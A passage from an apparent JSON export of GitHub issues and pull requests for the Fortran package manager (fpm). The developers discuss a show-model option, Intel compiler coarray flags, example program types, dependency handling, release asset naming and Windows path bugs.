                    "text": "In order to introduce a new command fpm show as in 6eef114 runs into a problem as in 1875088 that fpm_show_settings cannot be passed into call build_model(model, settings, package, error) which expects fpm_build_settings and it didn't work even if I subclassed fpm_build_settings with fpm_show_settings. So for now I am just going to implement an fpm build --show-model option, and later we can port it to a standalone command if somebody figures out how to do it.\n\n\nSo far passing setting%fpm_build_settings was used for other commands that require the build:\n\n  \n    \n      fpm/fpm/src/fpm.f90\n    \n    \n         Line 230\n      in\n      5ab3daf\n    \n    \n    \n    \n\n        \n          \n           call build_model(model, settings%fpm_build_settings, package, error) \n        \n    \n  \n\n\nNot optimal, accepting a class(fpm_build_settings) might be the preferable solution here.\n\n\nfpm_model_t%deps is of type dependency_tree_t which is defined outside of the Model. That is not a clean design, rather we need to port it to be fully defined and self sufficient inside the fpm_model.f90 file.\n\n\nThanks for the feedback on this. The dependency_tree_t type is implemented self-contained in the fpm_dependency module with the fpm_model_t using it as a way to represent dependencies. Also, the dependency tree can exist on its own outside of the model, like in the update command. What is the scheme you would prefer here?"
                },
                {
                    "user": "certik",
                    "date": "2020-12-22 23:45:24+00:00",
                    "text": "Thanks for the feedback on this. The dependency_tree_t type is implemented self-contained in the fpm_dependency module with the fpm_model_t using it as a way to represent dependencies. Also, the dependency tree can exist on its own outside of the model, like in the update command. What is the scheme you would prefer here?\n\nWhy not move it to fpm_model.f90 since it is already self contained? Then if the dependency tree needs to exists on its own, you just construct it on its own, but you use it from fpm_model."
                },
                {
                    "user": "certik",
                    "date": "2020-12-22 23:52:07+00:00",
                    "text": "ondrej.mp4"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-22 23:55:09+00:00",
                    "text": "@certik Let's defer the discussion around the fpm_dependency and fpm_model module relation to keep this PR on topic. I sense this could lead to bigger design decisions around the structuring of fpm."
                },
                {
                    "user": "certik",
                    "date": "2020-12-22 23:58:13+00:00",
                    "text": "@awvwgk yes, in fact most of the issues I found will lead to a bigger discussion, so I simply want to have this PR in, so that I can start developing the cmake backend, and we can figure those out later. I will also open up a dedicated issue for each."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-23 11:03:55+00:00",
                    "text": "...fpm_show_settings cannot be passed into call build_model(model, settings, package, error) which expects fpm_build_settings ...\n\nI'm unsure why this can't be implemented in the same way as the other commands or why the current implementation is 'not optimal', however I'm happy to pursue this in a separate PR.\n\n... build_target_t%dependencies(:) points to itself recursively and thus cannot be printed due to infinite recursion.\n\nmodel%targets is a flat structure containing all build targets, where target dependencies are pointers back into model%targets. This allows us to exploit allocatable arrays (and their cleanup) instead of allocating pointers directly. Because of this, you do not need to recurse over this structure to print it completely - for each target you only need to print a shortened representation of its dependencies (e.g. object file name).\nThere shouldn't be any infinite recursion as that would imply a dependency cycle.\n\n\nfpm_model_t%deps is of type dependency_tree_t which is defined outside of the Model\n\n\nIt seems to me that deps doesn't need to be in the model. @awvwgk is deps only required for fetching and resolving dependencies before model construction or is it also required after model construction for the custom backends? If it is not required after model construction then presumably it can be separated from the model type?\n\n\nThe srcfile_t are repeated for the same file several times, as they are first part of the package, and then part of the build targets. Is there a way to design this so that things do not repeat? Multiple targets can share a file, so it seems it's a matter of how to best print this, so that things are not repeated all the time.\n\n\nAgain since all source files are in model%sources, then when printing a build target only a short representation of the corresponding source file should be printed (e.g. source file name).\nRegarding your remaining points @certik, it seems that separating the build_target_t type and the model%targets array from the model might be a good idea for the near term. I'm happy to start work on this."
                },
                {
                    "user": "certik",
                    "date": "2020-12-23 16:42:24+00:00",
                    "text": "Thanks @LKedward. There is a lot to improve in all this, but my time is limited, and I feel having something in is better than nothing. We can all collectively improve things once this is in. I only have time to do the small things you pointed out, so I am going to do it now, and then if we merge it, others can easily fix some of the other stuff. The indentation of the output would be great, but it's a bit tricky, as you have to rework how you pass things: as lists of strings and tracking the indentation level. I have done that in LFortran but it's some work, so I would prefer to do it later, I don't have time to implement that right now."
                },
                {
                    "user": "certik",
                    "date": "2020-12-23 17:17:40+00:00",
                    "text": "@LKedward I implemented everything except string_cat, which I tried in certik@788ac77, but realized that it removes the \" from around the strings, and I really want that in the output around strings to make it clear it is a string (and also if there are spaces or commas in the path). So I reverted it."
                },
                {
                    "user": "certik",
                    "date": "2020-12-24 01:09:03+00:00",
                    "text": "Per @milancurcic's request:\n\n  \n    \n    \n\n    ondrej2.mp4"
                }
            ]
        },
        {
            "number": 289,
            "user": "everythingfunctional",
            "date": "2020-12-09 20:12:39+00:00",
            "title": "Add support for same compilers as Fortran version to Haskell version",
            "text": "This adds support for the same compilers as is currently in the Fortran version to the Haskell version. I would appreciate if anyone with access to these compilers to do some testing.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-12-10 00:36:26+00:00",
                    "text": "Might have left something set I did not intend to, but everyt application I build I get a warning message about MPI even in programs with no MPI calls when I use ifort; no problems with nvfortran or gfortran so far.   Does not occur with the Fortran version with same\ncompilers.  So just giving a heads-up.  If aligning the two versions I missed not being able to set a default compiler with $FPM_COMPILER as with ffpm.  I want to pull down the new OneAPI version as it is supposed to be fully f2018 and something I particularly want when doing this type of testing in particular is the intrinsic  COMPILER_OPTIONS(); which this version of ifort does not have.  Still testing but except for this message ifort, nvfortran, and gfortran look good on a Red Hat 8 box.\n\n M_calculator]$ fpm run --compiler ifort\n[0] MPI startup(): I_MPI_CAF_RUNTIME environment variable is not supported.\n[0] MPI startup(): Similar variables:\n         I_MPI_THREAD_RUNTIME\n[0] MPI startup(): To check the list of supported variables, use the impi_info utility or refer to https://software.intel.com/en-us/mpi-library/documentation/get-started.\n Enter expressions or \"funcs\" or \"dump\"\n\nerror===>*calculator* input line was empty\n3/4\n0.75 = 3/4\n.\n[urbanjs@localhost M_calculator]$ ifort --version\nifort (IFORT) 19.1.3.304 20200925\nCopyright (C) 1985-2020 Intel Corporation.  All rights reserved."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-10 01:31:04+00:00",
                    "text": "Thanks for testing @urbanjost . I may try out the Intel oneAPI on a Linux virtual machine soon. I haven't been very impressed with it on MacOS so far. ifx isn't available on Mac, and coarray features aren't available on Mac."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 11:13:01+00:00",
                    "text": "Thanks @everythingfunctional, I've also tried with Intel fortran.\nI get linker errors when using ifort (19.1.0.166, Ubuntu) with undefined references to various MPI routines.\nI think -coarray=single in ifort is not the same as -fcoarray=single in gfortran: in gfortran, the single mode links against a \"single-image library consisting of stubs\", whereas I think ifort is still generating backend code (MPI) but for just one image, hence the linker errors.\nPerhaps it's possible to link to the same caf_single stubs library with Intel, but this may not be a good solution.\nOtherwise it looks like only gfortran can support coarray code without generating a coarray executable."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 11:56:04+00:00",
                    "text": "Not needed for this PR, but worth noting that submodule support in Haskell fpm breaks with ifort (and possibly other compilers) due to various different smod naming conventions."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-10 14:01:57+00:00",
                    "text": "I see. That is disappointing, on both fronts. Is there proper submodule support in the Fortran version yet?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 16:10:52+00:00",
                    "text": "Is there proper submodule support in the Fortran version yet?\n\nYes there's support for submodules, though it's more rudimentary than the Haskell version since the implementation is ignorant of .mod/.smod files."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-10 18:11:40+00:00",
                    "text": "Ok, I'll pull the -coarray option out. Thanks for the review."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-11 02:45:19+00:00",
                    "text": "Odd. A few replies I made seem to be missing. Essentially I agree both packagers should remove coarray from the Intel compiler, especially because ifort allows users to add options in other ways, particularly with config files; although this allows users to \"corrupt\" the options used by a debug or release version.  Things have progressed enough we need a TOML-based method for specifying builds and custom options, especially for coarrays/OpenMP/MPI or we will limit what can easily be a package. The h-fpm version allows for custom make scripts which has allowed me to do special builds and link in external libraries like X11, etc. So we need a solution for the capability especially in f-fpm but I concur it has to go out of the defaults for now."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-14 14:26:44+00:00",
                    "text": "With the majority approval and nothing else appearing to be broken, I'm going to go ahead and merge."
                }
            ]
        },
        {
            "number": 287,
            "user": "certik",
            "date": "2020-12-09 19:18:42+00:00",
            "title": "Fix a typo in a comment",
            "text": "",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 19:23:18+00:00",
                    "text": "Will be fixed with #284 as well."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 10:12:04+00:00",
                    "text": "Closing as now fixed by #284"
                },
                {
                    "user": "certik",
                    "date": "2020-12-11 16:22:55+00:00",
                    "text": "Thanks!"
                }
            ]
        },
        {
            "number": 286,
            "user": "awvwgk",
            "date": "2020-12-09 17:51:22+00:00",
            "title": "Implement check for duplicated program names",
            "text": "check within an executable/test array for duplicate programs\nalso check that the program name is not empty or contains ascii control chars",
            "comments": []
        },
        {
            "number": 285,
            "user": "LKedward",
            "date": "2020-12-09 15:34:41+00:00",
            "title": "CI: update naming of release binaries",
            "text": "Remove 'v' prefix to version.\nUse 'haskell' instead of 'bootstrap'\n\nModified workflow has been tested in my fork.\nResolves #276",
            "comments": []
        },
        {
            "number": 284,
            "user": "LKedward",
            "date": "2020-12-09 14:41:03+00:00",
            "title": "Document model and backend for developers",
            "text": "Adds a high-level overview of the model and backend to demystify the internals of fpm for new and existing contributors\nAdds detailed documentation to individual modules and function where important\nUse pre-doc (!>) comments to be consistent with the rest of fpm",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-10 10:09:30+00:00",
                    "text": "Thanks for the review, merging."
                }
            ]
        },
        {
            "number": 283,
            "user": "LKedward",
            "date": "2020-12-09 13:37:19+00:00",
            "title": "ifort is generating threaded coarray code by default",
            "text": "I think the ifort coarray flag should be -coarray=single to match the default behaviour we have for gfortran.\nCurrently we have:\n\n  \n    \n      fpm/fpm/src/fpm_compiler.f90\n    \n    \n        Lines 139 to 144\n      in\n      6e46fba\n    \n    \n    \n    \n\n        \n          \n               case('release_ifort') \n        \n\n        \n          \n                  fflags = '& \n        \n\n        \n          \n                  & -fp-model precise& \n        \n\n        \n          \n                  & -pc 64& \n        \n\n        \n          \n                  & -align all& \n        \n\n        \n          \n                  & -coarray& \n        \n    \n  \n\n\nwhich I believe will default to generating shared-memory coarray code.\nLike OpenMP, coarrays should be enabled explicitly by a build option (#112 (comment)), except in the case of the caf compiler wrapper.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-12-09 16:27:06+00:00",
                    "text": "This would explain the results seen here: https://fortran-lang.discourse.group/t/the-counter-intuitive-rise-of-python-in-scientific-computing/469/7?u=ivanpribec"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-09 20:12:08+00:00",
                    "text": "Well, that explains a lot. Certainly should be changed, especially since ifort has more back doors for specifying compiler switches than any other compiler I know of.  Unlike most of the others using fpm an ifort compiler user can set additional compiler flags via config files (see $IFORTCFG) relatively easily.  I tested with > 20 packages and did not catch that.  I think I will add a mini-version of his code into my QA list of fpm packages; which raises the thought of whether we should have a shared set of fpm repositories and a quick basic test of them (or do we, and I do not know about it?).  And I have ifort now; just in time for the new Intel suite to be available free.  I think just running the test with gfortran is sufficient for now.\nWith the alpha out in the wild I'd like this picked off quickly.  I cannot make a PR right now; but will in about six hours if no one else has."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-09 21:09:46+00:00",
                    "text": "I'm trying out ifort since it was just released for free, but nowhere in their help is the option -coarray mentioned, and I get the message ifort: command line warning #10006: ignoring unknown option '-coarray=single'. However, if I add the flag -warn all before it (but not after) I don't get that message. Anybody else have ideas for this?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-09 21:14:43+00:00",
                    "text": "I think I figured it out. I'm on MacOS, where apparently coarrays aren't supported.\nerror #8347: Coarray is not supported on this platform.   [SUITE_FAILED]"
                },
                {
                    "user": "jvdp1",
                    "date": "2020-12-09 21:21:25+00:00",
                    "text": "I am not aware that iort support something like -coarray=single. AFAIK -coarray only accept shared (i.e. -coarray=shared) or distributed (-coarray=distributed)\nHowever, the following could maybe do the trick:\nifort -coarray=shared -coarray-num-images=1"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-09 22:42:45+00:00",
                    "text": "At least in newer versions it should take shared|distributed|coprocessor|single on the \"Classic\" ifort. Not sure out the ifx one.  If one of them is not present it will reject coarray syntax.   =single is supposed to be for debugging where it does not actually spawn multiple images but allows the syntax,  which does not quite jive with what everyone is seeing.  Are we talking the classic or new Intel compiler?  The new distribution comes with both."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-09 22:46:19+00:00",
                    "text": "If it literally is causing failures on any platform we need to take it out and for now Intel users can use a config file to enable it and hopefully soon additional flags will be supported in the TOML file and perhaps with --fflags|--flags on the fpm command line; but having coarray syntax be illegal by default is not very appealing so I am hoping -coarray=single is good everywhere and from the documentation I thought it would be; but that does not seem to be the case?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-10 01:24:31+00:00",
                    "text": "On MacOS it just issues a warning (sometimes) and ignores any -coarray flag. However, any code with coarray features cannot be compiled with ifort on MacOS."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 16:23:53+00:00",
                    "text": "which raises the thought of whether we should have a shared set of fpm repositories and a quick basic test of them\n\nThis is a good point and could be a useful to add to our automated CI checks."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-13 12:09:22+00:00",
                    "text": "Fixed by #300"
                }
            ]
        },
        {
            "number": 281,
            "user": "awvwgk",
            "date": "2020-12-08 21:46:46+00:00",
            "title": "Cleanup: Remove archived Rust prototype",
            "text": "As discussed in #253, this PR removes the archived Rust prototype from the repository.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-09 16:16:19+00:00",
                    "text": "Thanks @awvwgk I will merge"
                }
            ]
        },
        {
            "number": 280,
            "user": "awvwgk",
            "date": "2020-12-08 19:13:29+00:00",
            "title": "Create specification for example section",
            "text": "Add manifest reference for example applications\n Add example manifest type to Fortran fpm\n Integrate example in build command\n Allow running example applications in run command\n Implement example in Haskell fpm as well\n\nFixes #275",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-10 16:46:47+00:00",
                    "text": "Thanks for the fast review, I will go ahead and merge this PR soonish (after #266)."
                }
            ]
        },
        {
            "number": 278,
            "user": "awvwgk",
            "date": "2020-12-08 17:31:22+00:00",
            "title": "Enable discussions for this repository?",
            "text": "GitHub discussions is now in public beta and might be a suitable addition for discussion on fpm separated from the issues. It is currently opt-in at the settings tab of the repo.\nThis might overlap slightly with what we are currently using issues for and also maybe with the Fortran-lang discourse.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-12-08 17:41:19+00:00",
                    "text": "Good idea, I support it. fpm discussions on the Discourse so far were, I think, due to not there being any dedicated place to discuss fpm specifically.\nWe can enable it. Before we do, has anybody had experience with it? Is it ready for prime time?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-08 17:43:38+00:00",
                    "text": "I have seen it around at some other more popular repos, but not used it in my projects so far. I just enabled it at http://github.com/grimme-lab/xtb/discussions."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-08 17:49:10+00:00",
                    "text": "I just enabled it. I think I will like it. Worst case scenario, if it doesn't work for any reason, we turn it off."
                }
            ]
        },
        {
            "number": 277,
            "user": "LKedward",
            "date": "2020-12-08 16:54:21+00:00",
            "title": "Refactor: separate source parsing routines from source discovery",
            "text": "I'm in the process of adding developer documentation and I'd like to move the source parsing routines out of the fpm_sources module to better separate source parsing from source file discovery.\nThis PR moves the low-level source parsing routines to a new fpm_source_parsing module.\nThere are no functional changes in this PR \u2014 you can check this using git diff 1a7f3a4~ 1a7f3a4 --color-moved at the terminal after checking out the branch.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-10 10:10:23+00:00",
                    "text": "Changes applied by #284"
                }
            ]
        },
        {
            "number": 276,
            "user": "milancurcic",
            "date": "2020-12-08 15:47:04+00:00",
            "title": "Make Fortran binaries appear first in the list of release assets",
            "text": "https://github.com/fortran-lang/fpm/releases\nCurrently we have:\n\nfpm-bootstrap-v0.1.1-linux-x86_64\n...\nfpm-v0.1.1-linux-x86_64\n...\n\nAssets are sorted alphabetically, so fpm-bootstrap-* binaries come first. It's possible that, not knowing the difference, some users will reach for the bootstrap binaries first. Instead, we should gear them toward the Fortran binaries first, although it has shown recently that it's useful to have both, due to bugs and incomplete features on both sides.\nI recommend that we have the Fortran binaries appear first at the list of assets.\nAn easy fix would be to drop the \"v\" from the semantic version because it's the \"v\" that makes the Fortran binaries come after the Haskell ones. \"v\" is not that common anyway--you're more likely to see something like gcc-9.3.0 than gcc-v9.3.0.\nAlso, related to #253, considering that the \"bootstrapping\" property is no longer unique to the Haskell fpm, I suggest we just distribute these as fpm-haskell-* instead of fpm-bootstrap-*, to minimize confusion.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-08 15:55:18+00:00",
                    "text": "Good points, I agree with you on all three. This should be a relatively simple change to the CI."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-08 16:17:31+00:00",
                    "text": "https://github.com/fortran-lang/setup-fpm/ which will also need updating (also simple)."
                }
            ]
        },
        {
            "number": 275,
            "user": "awvwgk",
            "date": "2020-12-08 07:10:17+00:00",
            "title": "Allow example as special executable type",
            "text": "Suggested in #257 (review).\nAdditionally to the currently available executable and test tables an example table would allow to have usage example in a project which do not count as production executables but rather as demonstrations.\nThe syntax would be identical to the executable and test table with:\n[[example]]\nname = \"demo\"\nsource-dir = \"example\"  # suggestions for the default dir?\nmain = \"main.f90\"\nAlso, example executables can be automatically discovered like executables or test:\n[build]\nauto-examples = true",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-12-08 15:59:33+00:00",
                    "text": "I love this idea. I now see that Cargo has it too.\nHaving examples as a kind of binary would encourage people to write more examples on how to use their libraries.\nI personally learn more easily from runnable examples than from documentation.\nexamples/ seems to me like a good directory name. Just like Cargo.\nI also think all programs in examples/ should be built automatically (like tests), without a special flag in the manifest."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-08 17:55:42+00:00",
                    "text": "I was thinking  about something like this and had in mind dev/  for developer and then maybe having subdirectories like example|sample, benchmark, so as not to clutter the top directory too much,  but if example/  (and benchmark/ ?) are already in common use ( any measure of the audience different package managers have?)  and no one sees that becoming a dozen directories then just starting with example/  (or  demo/ or sample/, I personally have no strong preference on that name) .\nSo should the new subcommand generate an example/ directory?\nI also confuse myself when I do not adhere to a strict rule about plurals.  If we are using /app and /test I think it should be /example instead of /examples. So far we have stuck to the singular and mixing that makes it harder to remember."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-08 18:14:08+00:00",
                    "text": "FWIW, Cargo uses src, benches, examples, and tests (https://doc.rust-lang.org/cargo/guide/project-layout.html).\nAlthough \"benches\" is is perhaps more technically accurate, I like how \"benchmarks\" sounds."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-08 19:05:27+00:00",
                    "text": "OK. I think there should be a switch on new for the two new ones and that they should be adopted as above into the metrics.  I waffle between whether they should be created by default with new though.  I think an install should not install those files so a simple install would just be for apps. With a new category in the TOML file as proposed above it would be easy to skip installing them.  With the no autobuild option you could prevent the possibly annoying build of every test and demo and benchmark every time you make a source code and just want to build your main src/ stuff or just do an fpm test so I think that works for me. I wonder if the default for bench|benches|benchmark and example|examples should be no auto build but that would be easier to decide with a working prototype.\nI know I have a bias here and not sure how common the need is for everyone but my aspiration when building a library|module for public consumption is that each routine have a manpage with a working demo program that I automatically extract and build and run so it is testable. That can mean having dozens of small example programs that I do not want included in an install (I say aspiration because I do not always get around to that, but really thing it is a good practice!). So speaking personally this would be great."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-08 19:11:19+00:00",
                    "text": "PS:  I use scale/ but I think benchmark/ is better."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 18:05:41+00:00",
                    "text": "I decided to just go ahead and create a PR to update both Fortran and Haskell fpm with an example program type. Since we are using singular nouns for test and executable I used this for example as well. Let me know what you think."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-09 18:12:01+00:00",
                    "text": "Personally I prefer \"tests\" and \"examples\" (plural) as it encourages making multiples of those, and most packages would benefit from multiple tests and examples. For \"app\" I'm okay with singular because application packages are more likely to be singular (I think?).\nSo I suggest changing \"test\" to \"tests\" sooner rather than later.\nBut this is minor preference--60/40 kind of thing. :)"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 19:02:08+00:00",
                    "text": "I was more thinking about being compatible with the table names here, changing those is harder, not impossible, TOML-Fortran can easily migrate such a change in a backwards compatible way. For the default directory names, we can discuss changing those in another PR, for now I would like to be consistent with the existing implementation (one feature at a time)."
                }
            ]
        },
        {
            "number": 274,
            "user": "LKedward",
            "date": "2020-12-07 15:18:07+00:00",
            "title": "Update README with link to setup-fpm github action.",
            "text": "",
            "comments": []
        },
        {
            "number": 273,
            "user": "awvwgk",
            "date": "2020-12-06 23:07:00+00:00",
            "title": "Update developer documentation (manifest + command line)",
            "text": "Now that @milancurcic has created https://fpm.fortran-lang.org we should populate the documentation a bit. I will make a start with the manifest and the command line.\n\npopulate the landing page at https://fpm.fortran-lang.org\nlink with the TOML homepage and describe the package manifest format\nsketch the implementation of the TOML parsing and link to TOML-Fortran\ndescribe the scope of fpm with respect to the package manifest\nlink with the M_CLI2 repository and describe the command line interface\nadd a short documentation on the usage of M_CLI2 for the command line\ndescribe the process of adding new subcommands and arguments\noutline the generation of the developer pages and link to the FORD wiki",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-12-07 03:09:26+00:00",
                    "text": "Up till now I had put the calls to M_CLI2 in.  Recently the include command was added without any assist from me, so their might be some fresh insights there on how hard that was to do. I have used something M_CLI2 was drawn from (M_kracken) for so long it is almost a reflex for me to use it. But I can put something together pretty quickly on how to add a new subcommand if you like. I have not gone back to add direct support of subcommands in M_CLI2. That is something it does not directly support as a feature, but I thought it has held up well enough so far (and recently was compiled with ifort, nvfortran, and nagfor and appears to work) so"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-07 11:01:00+00:00",
                    "text": "Another big thing would be the documentation of the model and the build process, @LKedward would you like to write something on this or should I give it a try? However I would make the documentation of the model and build process a separate PR."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-07 11:04:40+00:00",
                    "text": "Another big thing would be the documentation of the model and the build process, @LKedward would you like to write something on this or should I give it a try?\n\nYep I would be happy to \ud83d\udc4d. I'll start work for a separate PR - should I add to docs.md or create a new page?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-07 11:09:52+00:00",
                    "text": "My strategy in this PR is to create a small introduction on the landing page regarding all important aspects of fpm, so far the manifest, command line and the documentation, and link to the respective parts in the pages, the module docs or external resources, whatever is appropriate and most useful."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-08 14:18:26+00:00",
                    "text": "This is a great start on improving (creating) the developer documentation and doesn't contain any code changes so I'll now merge. Thanks @awvwgk. I'll have a PR building on this soon."
                }
            ]
        },
        {
            "number": 272,
            "user": "LKedward",
            "date": "2020-12-06 12:33:05+00:00",
            "title": "Use fpm as an test package in the CI",
            "text": "As discussed, we should build, run and test fortran fpm using fortran fpm in the CI just like we do with the existing example packages.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-03-02 21:37:12+00:00",
                    "text": "I'll take care of this once #352 is merged."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-31 18:56:46+00:00",
                    "text": "Closing since implemented via #420."
                }
            ]
        },
        {
            "number": 271,
            "user": "LKedward",
            "date": "2020-12-05 17:25:23+00:00",
            "title": "Fix Windows run and test commands",
            "text": "Removes a hard-code forward-slash in the model definition. Fixes #269.\nUpdates CI scripts to invoke fpm run and fpm test for the fortran implementation. Fixes #270.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-08 14:09:30+00:00",
                    "text": "I'll also merge this today if there are no more comments, and create a new prerelease v0.1.2."
                }
            ]
        },
        {
            "number": 270,
            "user": "LKedward",
            "date": "2020-12-05 16:49:21+00:00",
            "title": "`fpm run` and `fpm test` are not tested in the CI",
            "text": "This resulted in #269",
            "comments": []
        },
        {
            "number": 269,
            "user": "LKedward",
            "date": "2020-12-05 16:45:26+00:00",
            "title": "'fpm run' and 'fpm test' do not work on Windows",
            "text": "C:\\msys64\\home\\lk\\git\\fpm\\fpm>fpm run -- run\n + build/gfortran_debug\\app\\fpm.exe\n'build' is not recognized as an internal or external command,\noperable program or batch file.\n Command failed\nERROR STOP\nAppears to be due to a hard-coded forward slash here:\n\n  \n    \n      fpm/fpm/src/fpm.f90\n    \n    \n         Line 174\n      in\n      af67eae\n    \n    \n    \n    \n\n        \n          \n           model%output_directory = 'build/gfortran_release' \n        \n    \n  \n\n\nand here:\n\n  \n    \n      fpm/fpm/src/fpm.f90\n    \n    \n         Line 184\n      in\n      af67eae\n    \n    \n    \n    \n\n        \n          \n           model%output_directory = 'build/gfortran_debug'",
            "comments": []
        },
        {
            "number": 268,
            "user": "everythingfunctional",
            "date": "2020-12-05 06:28:48+00:00",
            "title": "Fix dependency tracking issue in bootstrap version",
            "text": "The bootstrap version was not correctly marking library modules as dependencies in the compilation process, leading to improper partial rebuilds in some situations. This fixes that issue.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-06 01:01:32+00:00",
                    "text": "Thanks for confirming. Merging now."
                }
            ]
        },
        {
            "number": 267,
            "user": "LKedward",
            "date": "2020-12-03 15:37:24+00:00",
            "title": "Fix enumeration of non-library link objects",
            "text": "Fixes #263 caused by missing out some non-library dependencies in link_objects list for executable targets.\nUpdate target dependency test-suite to build and check the link_objects list for link targets\nUpdate hello_complex_2 example package to include an indirectly use'd non-library module dependency\n\niso_varying_string now builds with Fortran fpm and unit tests pass (fpm test unit_test).",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-03 17:43:18+00:00",
                    "text": "\ud83d\udc4d  Thanks for fixing it @LKedward"
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-08 14:07:58+00:00",
                    "text": "Thanks for reviewing @awvwgk. I'll merge later today if there are no more comments."
                }
            ]
        },
        {
            "number": 266,
            "user": "awvwgk",
            "date": "2020-12-02 20:18:47+00:00",
            "title": "Dependency handling",
            "text": "Take two on the dependency handling (see #251 for a recursive implementation).\n\n create a dependency tree data type with serde functionality\n allow translation from and to TOML of dependency tree\n implement iterative fetching of each dependency level\n use dependency tree in build_model\n update functionality for fpm-update subcommand\n build_model should use the dependency tree exclusively\n\nRelated #121\nFixes #265\nProposed command line interface for fpm-update\nName\n    fpm-update(1) - manage project dependencies\n\nSynopsis\n    fpm update [--fetch-only] [--verbose] [--clean] [name(s)]\n\nDescription\n    Manage and update project dependencies. If no dependency names are\n    provided all the dependencies are updated automatically.\n\nOptions\n  --clean       Ignore an existing package cache file\n  --fetch-only  Only fetch dependencies, do not update existing projects\n  --verbose     Show additional printout\n\nExamples\n 1. Initialize all project dependencies\n\n    fpm update --fetch-only\n\n 2. Update a list of dependencies\n\n    fpm update --verbose dep1 dep2\n\nDependency management strategy\n\ndependencies are handled iteratively\ncurrent project is added as first project to the dependency tree\nall nodes in the dependency tree visited and their dependencies are added to the tree\nrepeat step 3 until all dependencies in the tree are visited\ncreate a cache of the dependency tree (build/cache.toml)",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-05 19:40:45+00:00",
                    "text": "I getting toward a working version here, one issue I noted is that git tags are not reliable and we have to treat them like branch names for now. One can actually force push and delete a tag with git, making it impossible to tell for fpm whether or not a dependency is fetched correctly without retrieving upstram. Therefore, I moved the TOML-Fortran pinning from tag to rev.\nRight now the version is fully functional, while doing still a bit of redundant work for the fpm-build model, effectively walking the dependency tree twice, but the depth first approach of fpm-build will always find the already fetched dependencies from the dependency tree initialization doing no harm. I'll clean this up soon, but open the PR for feedback already.\nCleaned up and ready for review."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-06 13:33:12+00:00",
                    "text": "Seems like I always overlook parts of the command line documentation, I have to make a checklist for creating new commands to make sure I get it added to all the right places for the next time. Thanks for the reminder."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-08 19:50:34+00:00",
                    "text": "I would like to move at least one of new commands (fpm-install / fpm-update) forward to focus again on the fpm-dist command. Let me know if there is anything blocking this PR in particular."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-08 22:05:04+00:00",
                    "text": "Let me know if there is anything blocking this PR in particular.\n\nI'm happy for this PR to move forward; it would be good to get a second review if possible."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 10:44:00+00:00",
                    "text": "Since this PR will close multiple issues and allow work to move forward elsewhere I think this can be merged if there are no further comments. @awvwgk are you happy to merge when you're ready?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-10 11:08:59+00:00",
                    "text": "Sounds good, I will rebase and merge this branch later today. If there are problems coming up later we can still handle those separately."
                }
            ]
        },
        {
            "number": 265,
            "user": "everythingfunctional",
            "date": "2020-12-01 02:39:11+00:00",
            "title": "Failure to build jsonff",
